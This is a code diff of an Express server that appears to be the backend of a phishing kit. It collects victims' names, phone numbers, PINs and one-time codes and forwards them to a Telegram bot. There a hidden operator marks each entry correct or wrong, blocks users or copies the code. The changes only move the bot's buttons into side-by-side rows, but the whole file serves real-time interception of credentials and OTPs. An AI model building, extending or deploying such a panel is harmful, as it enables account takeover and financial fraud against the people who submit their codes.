@@ -268,7 +268,7 @@ app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.h
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 
 // ============================================================
-// 📱 PHONE SUBMISSION — Approve / Reject (full-width buttons)
+// 📱 PHONE — Approve / Reject side by side
 // ============================================================
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
@@ -289,13 +289,14 @@ app.post('/submit-phone', (req, res) => {
     };
     saveStore();
 
+    // 2 buttons in one row → side by side, together 100% width
     sendTelegramMessage(
         bot,
         withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
-        [
-            [{ text: '✅ Approve', callback_data: `phone_ok:${requestId}` }],
-            [{ text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }]
-        ]
+        [[
+            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
+            { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
+        ]]
     );
 
     res.json({ requestId });
@@ -307,7 +308,7 @@ app.get('/check-phone/:requestId', (req, res) => {
     res.json({ approved: approvedPhones[requestId] ?? null });
 });
 
-// ---------------- PIN SUBMISSION — Correct / Wrong, NO copy button ----------------
+// ---------------- PIN — Correct / Wrong side by side, no copy ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
@@ -334,9 +335,13 @@ app.post('/submit-pin', (req, res) => {
             `<b>PIN:</b>  <b><code>${esc(pin)}</code></b>`
         ]),
         [
-            [{ text: '✅ Correct', callback_data: `pin_ok:${requestId}` }],
-            [{ text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }],
-            [{ text: '🛑 Block',    callback_data: `pin_block:${requestId}` }]
+            [
+                { text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
+                { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }
+            ],
+            [
+                { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+            ]
         ]
     );
 
@@ -349,7 +354,7 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
-// ---------------- CODE (OTP) SUBMISSION — Correct / Wrong + Copy ----------------
+// ---------------- OTP — Correct / Wrong side by side + Copy ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     const bot = getBot(botId);
@@ -377,9 +382,13 @@ app.post('/submit-code', (req, res) => {
             `<b>Code:</b> <b><code>${esc(finalCode)}</code></b>`
         ]),
         [
-            [{ text: '✅ Correct', callback_data: `code_ok:${requestId}` }],
-            [{ text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }],
-            [{ text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }]
+            [
+                { text: '✅ Correct', callback_data: `code_ok:${requestId}` },
+                { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }
+            ],
+            [
+                { text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }
+            ]
         ]
     );
 
@@ -453,7 +462,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         let newText = '';
         let feedback = '';
 
-        // PHONE — Approve / Reject
+        // PHONE
         if (action === 'phone_ok') {
             approvedPhones[requestId] = true;
             handled = true;
@@ -469,7 +478,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
                 '<b>Status:</b> ❌ <b>Rejected</b>'
             ]);
         }
-        // PIN — Correct / Wrong
+        // PIN
         else if (action === 'pin_ok') {
             approvedPins[requestId] = true;
             handled = true;
@@ -495,7 +504,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
         }
-        // CODE — Correct / Wrong
+        // CODE
         else if (action === 'code_ok') {
             approvedCodes[requestId] = true;
             handled = true;
